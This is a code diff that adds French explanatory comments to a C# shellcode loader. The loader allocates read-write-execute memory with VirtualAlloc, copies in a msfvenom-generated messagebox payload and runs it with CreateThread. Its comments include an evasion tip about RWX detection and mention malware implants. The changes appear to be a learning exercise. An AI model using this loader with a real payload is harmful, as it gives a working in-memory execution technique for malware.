@@ -9,23 +9,28 @@ namespace Loader
         // P/Invoke definitions to interface with the Windows API
         
         // https://pinvoke.net/default.aspx/kernel32/VirtualAlloc.html
+        //definit les droits d'accès en mémoire (lecture / ecriture / execution)
         public const uint EXECUTEREADWRITE = 0x40;
+        //indique le type d'allocation mémoire (réservation et engagement)
         public const uint COMMIT_RESERVE = 0x3000;
-
+        //définie dans une DLL native Windows, et sera appelée depuis C# via P/invoke
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        //VirtualAlloc fonction windows utilisée pour reserver t allouer de la memoire dans l'espace du processus courant --> sert a illustrer la gestion mémoire bas niveau.
         public static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);
 
         // https://pinvoke.net/default.aspx/kernel32/CreateThread.html
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        //PErmet de créer un Thread natif dans le processus courant
         public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, uint lpThreadId);
 
         // https://pinvoke.net/default.aspx/kernel32/WaitForSingleObject.html
         [DllImport("kernel32.dll", SetLastError = true)]
+        //fonction de synchro windows, evite que le programme principal se termine prématurément.
         public static extern UInt32 WaitForSingleObject(IntPtr hHandle, Int32 dwMilliseconds);
 
         public static void Main()
         {
-
+            // Represente les données binaires brutes stockées en méoire
             // Define our shellcode as a csharp byte array
             //msfvenom -p windows/x64/messagebox TEXT='Task failed successfully!' TITLE='Error!' -f csharp --> j'ai obtenu ce code via kali linux
             byte[] sc = new byte[318] {0xfc,0x48,0x81,0xe4,0xf0,0xff,
@@ -61,17 +66,22 @@ namespace Loader
 
             // Allocate RWX (read-write-execute) memory to execute the shellcode from
             // Opsec tip: RWX memory can easily be detected. Consider making memory RW first, then RX after writing your shellcode
+            //on reserver une zone mémoire et on lui applique des droits spécifiques
             int scSize = sc.Length;
             IntPtr payAddr = VirtualAlloc(IntPtr.Zero, scSize, COMMIT_RESERVE, EXECUTEREADWRITE);
        
             // Copy the shellcode into our assigned region of RWX memory
+            //on transfere les données du tableau C# vers la memoire pointée par payaddres
             Marshal.Copy(sc, 0, payAddr, scSize);
 
             // Create a thread at the start of the executable shellcode to run it!
+            //on créé in thread natif et on demarre son execution à une adresse de mémoire donnée
             IntPtr payThreadId = CreateThread(IntPtr.Zero, 0, payAddr, IntPtr.Zero, 0, 0);
 
             // Wait for our thread to exit to prevent program from closing before the shellcode ends
             // This is especially relevant for long-running shellcode, such as malware implants
+            //on indique au programme principal d'attendre la fin du thread créee
+            //cela montre l'importance de la synchro entre kles threads
             uint waitResult = WaitForSingleObject(payThreadId, -1);
         }
     }
